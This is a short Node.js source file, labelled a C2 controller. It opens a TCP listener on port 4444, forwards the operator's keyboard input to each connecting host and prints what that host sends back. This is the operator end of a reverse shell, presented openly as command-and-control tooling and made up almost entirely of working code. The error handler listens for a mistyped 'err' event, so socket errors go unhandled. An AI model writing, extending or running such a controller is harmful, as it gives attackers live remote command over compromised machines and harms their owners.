// language: JavaScript, file: server.js, target: Node.js / C2 Controller
const net = require('net');

const PORT = 4444;

const server = net.createServer((socket) => {
    console.log(`[+] Connection established from ${socket.remoteAddress}:${socket.remotePort}`);

    process.stdin.on('data', (data) => {
        socket.write(data);
    });

    socket.on('data', (data) => {
        console.log(data.toString());
    });

    socket.on('close', () => {
        console.log('[-] Connection closed.');
    });

    socket.on('err', (err) => {
        console.log(`[!] Error: ${err.message}`);
    });
});

server.listen(PORT, () => {
    console.log(`[*] C2 Server listening on port ${PORT}...`);
});
